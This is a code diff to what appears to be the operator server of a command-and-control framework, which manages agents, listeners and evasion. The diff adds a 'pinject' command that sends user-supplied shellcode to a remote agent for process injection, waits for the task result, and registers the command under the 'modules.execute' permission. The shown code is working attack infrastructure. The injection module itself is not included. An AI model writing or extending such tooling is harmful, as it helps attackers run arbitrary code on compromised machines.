@@ -480,7 +480,7 @@ class RemoteCLIServer:
                         
                         return output, status
                     finally:
-                        session.current_agent = original_agent  # Restore to prevent side effects
+                        session.current_agent = original_agent
                 else:
                     return f"Module '{module_name}' does not have an execute function", 'error'
             else:
@@ -488,6 +488,121 @@ class RemoteCLIServer:
                 
         except Exception as e:
             return f"Error running module: {str(e)}", 'error'
+
+    def handle_pinject_command(self, command_parts, session):
+        module_name = "pinject"
+
+        if len(command_parts) < 2:
+            return "USAGE: pinject <shellcode> [agent_id=<agent_id>]", 'error'
+
+        try:
+            db = session.agent_manager.db if session.agent_manager else self.db
+            module_manager = self.module_manager
+
+            options = {}
+
+            if '=' in command_parts[1]:
+                for part in command_parts[1:]:
+                    if '=' in part:
+                        key, value = part.split('=', 1)
+                        options[key] = value
+            else:
+                shellcode_input = command_parts[1]
+                options['shellcode'] = shellcode_input
+
+                for part in command_parts[2:]:
+                    if '=' in part:
+                        key, value = part.split('=', 1)
+                        options[key] = value
+
+            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
+                options['agent_id'] = session.current_agent
+
+            wait_timeout = int(options.get('wait_timeout', 0))
+
+            module_manager.load_all_modules()
+            module_manager.load_modules_from_db()
+
+            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})
+
+            if module_name not in loaded_modules_dict:
+                import importlib.util
+                module_path = os.path.join("modules", f"{module_name}.py")
+                if os.path.exists(module_path):
+                    spec = importlib.util.spec_from_file_location(module_name, module_path)
+                    module = importlib.util.module_from_spec(spec)
+                    spec.loader.exec_module(module)
+
+                    if hasattr(module, 'get_info'):
+                        module_info = module.get_info()
+                    else:
+                        module_info = {}
+
+                    loaded_modules_dict[module_name] = {
+                        'module': module,
+                        'info': module_info,
+                        'path': module_path
+                    }
+                else:
+                    return f"Module not found: {module_name}", 'error'
+
+            if module_name in loaded_modules_dict:
+                module_data = loaded_modules_dict[module_name]
+                module = module_data['module']
+                info = module_data.get('info', {})
+
+                if hasattr(module, 'execute'):
+                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
+                    missing = [opt for opt in required_options if opt not in options]
+                    if missing:
+                        return f"Missing required options: {', '.join(missing)}", 'error'
+
+                    agent_id = options.get('agent_id')
+                    if agent_id:
+                        if session.agent_manager.is_agent_locked_interactively(agent_id):
+                            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
+                            if lock_info and lock_info['operator'] != session.username:
+                                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'
+
+                    original_agent = session.current_agent
+                    try:
+                        result = module.execute(options, session)
+                        if 'success' in result:
+                            status = 'success' if result['success'] else 'error'
+                            output = result.get('output', result.get('error', 'Unknown error'))
+                        else:
+                            output = result.get('output', 'No output')
+                            status = result.get('status', 'unknown')
+
+                        if status == 'success' and wait_timeout > 0 and 'task_id' in result:
+                            task_id = result['task_id']
+                            agent_id = options.get('agent_id')
+                            if not agent_id:
+                                return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'
+
+                            import time
+                            start_time = time.time()
+                            while time.time() - start_time < wait_timeout:
+                                task_data = db.execute(
+                                    "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
+                                    (task_id, agent_id)
+                                ).fetchone()
+                                if task_data and task_data['status'] == 'completed':
+                                    return f"Task {task_id} completed: {task_data['result']}", 'success'
+                                time.sleep(1)
+
+                            return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'
+
+                        return output, status
+                    finally:
+                        session.current_agent = original_agent
+                else:
+                    return f"Module '{module_name}' does not have an execute function", 'error'
+            else:
+                return f"Could not load module: {module_name}", 'error'
+
+        except Exception as e:
+            return f"Error running pinject: {str(e)}", 'error'
 
     def handle_agent_command(self, command_parts, session):
         if len(command_parts) < 2:
@@ -3310,6 +3425,8 @@ EXAMPLES:
                     return self.handle_modules_command(command_parts, session)
                 elif base_command == 'run':
                     return self.handle_run_command(command_parts, session)
+                elif base_command == 'pinject':
+                    return self.handle_pinject_command(command_parts, session)
                 elif base_command == 'agent':
                     return self.handle_agent_command(command_parts, session)
                 elif base_command == 'evasion':
@@ -3662,6 +3779,8 @@ DB Inactive:       {stats['db_inactive_agents']}
             return self.handle_modules_command(command_parts, session)
         elif base_command == 'run':
             return self.handle_run_command(command_parts, session)
+        elif base_command == 'pinject':
+            return self.handle_pinject_command(command_parts, session)
         elif base_command == 'agent':
             return self.handle_agent_command(command_parts, session)
         elif base_command == 'evasion':
@@ -4017,6 +4136,7 @@ DB Inactive:       {stats['db_inactive_agents']}
                 'listener': 'listeners.list',  # Default listener permission
                 'modules': 'modules.list',
                 'run': 'modules.execute',
+                'pinject': 'modules.execute',
                 'task': 'tasks.list',
                 'result': 'results.view',
                 'download': 'tasks.create',
